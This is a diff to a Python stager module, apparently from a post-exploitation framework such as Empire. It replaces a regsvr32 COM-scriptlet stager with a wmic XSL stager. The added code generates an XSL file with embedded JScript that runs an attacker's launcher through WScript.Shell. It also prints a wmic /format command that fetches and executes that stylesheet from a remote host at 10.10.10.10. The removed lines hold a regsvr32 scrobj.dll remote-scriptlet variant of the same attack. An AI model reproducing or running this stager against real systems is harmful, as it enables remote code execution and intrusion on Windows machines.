@@ -6,14 +6,14 @@ class Stager:
     def __init__(self, mainMenu, params=[]):
 
         self.info = {
-            'Name': 'regsvr32',
+            'Name': 'wmic',
 
-            'Author': ['@subTee', '@enigma0x3'],
+            'Author': ['@CyberVaca'],
 
-            'Description': ('Generates an sct file (COM Scriptlet) Host this anywhere'),
+            'Description': ('Generates an xsl file (COM Scriptlet) Host this anywhere'),
 
             'Comments': [
-                'On the endpoint simply launch regsvr32 /u /n /s /i:http://server/file.sct scrobj.dll '
+                'On the endpoint simply launch wmic process get brief /format:"http://10.10.10.10/launcher.xsl"'
             ]
         }
 
@@ -52,9 +52,9 @@ class Stager:
                 'Value'         :   r'Token\All\1,Launcher\STDIN++\12467'
             },
             'OutFile': {
-                'Description':   'File to output SCT to, otherwise displayed on the screen.',
+                'Description':   'File to output XSL to, otherwise displayed on the screen.',
                 'Required':   False,
-                'Value':   '/tmp/launcher.sct'
+                'Value':   '/tmp/launcher.xsl'
             },
             'UserAgent': {
                 'Description':   'User-agent string to use for the staging request (default, none, or other).',
@@ -112,24 +112,17 @@ class Stager:
             print helpers.color("[!] Error in launcher command generation.")
             return ""
         else:
-            code = "<?XML version=\"1.0\"?>\n"
-            code += "<scriptlet>\n"
-            code += "<registration\n"
-            code +=     "description=\"Win32COMDebug\"\n"
-            code +=     "progid=\"Win32COMDebug\"\n"
-            code +=     "version=\"1.00\"\n"
-            code +=     "classid=\"{AAAA1111-0000-0000-0000-0000FEEDACDC}\"\n"
-            code += " >\n"
-            code += " <script language=\"JScript\">\n"
-            code += "      <![CDATA[\n"
-            code += "           var r = new ActiveXObject(\"WScript.Shell\").Run('" + launcher.replace("'", "\\'") + "');\n"
-            code += "      ]]>\n"
-            code += " </script>\n"
-            code += "</registration>\n"
-            code += "<public>\n"
-            code += "    <method name=\"Exec\"></method>\n"
-            code += "</public>\n"
-            code += "</scriptlet>\n"
-            command = """\n[+] regsvr32.exe /s /n /u /i:"http://10.10.10.10/launcher.sct" scrobj.dll"""                       
-            print colored(command, 'green', attrs=['bold'])
+            code = """<?xml version='1.0'?>
+                                      <stylesheet
+                                      xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
+                                      xmlns:user="placeholder"
+                                      version="1.0">
+                                      <output method="text"/>
+                                      <ms:script implements-prefix="user" language="JScript">
+                                      <![CDATA[ \n"""
+            code += "                 var r = new ActiveXObject(\"WScript.Shell\").Run('" + launcher.replace("'", "\\'") + "');\n"
+            code += """            ]]></ms:script>
+                                   </stylesheet>"""
+            command = """\n[+] wmic process get brief /format:"http://10.10.10.10/launcher.xsl" """                       
+            print colored(command, 'green', attrs=['bold'])                       
         return code
